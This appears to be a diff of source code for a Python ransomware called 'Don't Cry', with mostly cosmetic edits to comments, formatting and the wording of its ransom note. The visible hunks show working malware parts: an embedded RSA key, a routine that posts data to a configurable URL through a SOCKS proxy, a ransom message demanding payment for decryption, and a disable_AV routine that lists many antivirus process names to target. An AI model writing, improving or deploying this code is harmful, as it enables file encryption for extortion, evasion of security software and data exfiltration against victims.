@@ -50,7 +50,7 @@ rmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuBydKlcp
 xwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992jFJ3j
 8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxdtH80
 fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQAB
------END RSA PUBLIC KEY-----"""
+-----END RSA PUBLIC KEY-----""" # Replace with your public key if needed
 
 
 def is_admin():
@@ -371,7 +371,7 @@ def start_encryption():
         proxies = {
             "http": f"socks5h://{YOUR_PROXY}",
             "https": f"socks5h://{YOUR_PROXY}",
-        }  # Replace with your proxy if needed
+        }
 
         try:
             requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
@@ -459,7 +459,7 @@ def encrypt_directory(directory_path, key):
 
 
 def shutdown():
-    msg = f"""  _______                     __   __             ______
+    msg = rf"""  _______                     __   __             ______
  |       \                   |  \ |  \           /      \
  | $$$$$$$\  ______   _______| $$_| $$_         |  $$$$$$\  ______   __    __ 
  | $$  | $$ /      \ |       \\$|   $$ \        | $$   \$$ /      \ |  \  |  \
@@ -477,7 +477,7 @@ All of your important files have been encrypted by the Don't Cry ransomware.
 To get them back, please follow the instructions below.
 
 1. Do not try to recover your files by yourself!
-- If you try to decrypt the encryption by yourself, your files will be permanently lost.
+- If you try to decrypt the encryption yourself, your files will be permanently lost.
 
 2. How to restore your files?
 - You need to pay a ransom to get the decryption key.
@@ -537,7 +537,7 @@ def disable_AV():
         "ccapp", "ccevtmgr", "ccimscan", "ccproxy", "ccpwdsvc", "ccpxysvc", "ccsetmgr", "cfgwiz", "cfp", "clamd", "clamservice", "clamtray", "cmdagent", "cpd", "cpf", "csinsmnt", "dcsuserprot", "defensewall", "defensewall_serv", "defwatch", "f-agnt95", "fpavupdm", "f-prot95",
         "f-prot", "fprot", "fsaua", "fsav32", "f-sched", "fsdfwd", "fsm32", "fsma32", "fssm32", "f-stopw", "f-stopw", "fwservice", "fwsrv", "iamstats", "iao", "icload95", "icmon", "idsinst", "idslu", "inetupd", "irsetup", "isafe", "isignup",
         "issvc", "kav", "kavss", "kavsvc", "klswd", "kpf4gui", "kpf4ss", "livesrv", "lpfw", "mcagent", "mcdetect", "mcmnhdlr", "mcrdsvc", "mcshield", "mctskshd", "mcvsshld", "mghtml", "mpftray", "msascui", "mscifapp", "msfwsvc", "msgsys", "msssrv",
-        "navapsvc","navapw32","navlogon.dll","navstub","navw32","nisemsvr","nisum","nmain","noads","nod32krn","nod32kui","nod32ra","npfmntor","nprotect","nsmdtr","oasclnt","ofcdog","opscan","ossec-agent","outpost","paamsrv","pavfnsvr","pcclient",
+        "navapsvc", "navapw32", "navlogon.dll", "navstub", "navw32", "nisemsvr", "nisum", "nmain", "noads", "nod32krn", "nod32kui", "nod32ra", "npfmntor", "protect", "nsmdtr", "oasclnt", "ofcdog", "opscan", "ossec-agent", "outpost", "paamsrv", "pavfnsvr", "pcclient",
         "pccpfw", "pccwin98", "persfw", "protector", "qconsole", "qdcsfs", "rtvscan", "sadblock", "safe", "sandboxieserver", "savscan", "sbiectrl", "sbiesvc", "sbserv", "scfservice", "sched", "schedm", "scheduler daemon", "sdhelp", "serv95", "sgbhp", "sgmain", "slee503",
         "smartfix", "smc", "snoopfreesvc", "snoopfreeui", "spbbcsvc", "sp_rsser", "spyblocker", "spybotsd", "spysweeper", "spysweeperui", "spywareguard.dll", "spywareterminatorshield", "ssu", "steganos5", "stinger", "swdoctor", "swupdate", "symlcsvc", "symundo", "symwsc", "symwscno", "tcguard", "tds2-98",
         "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
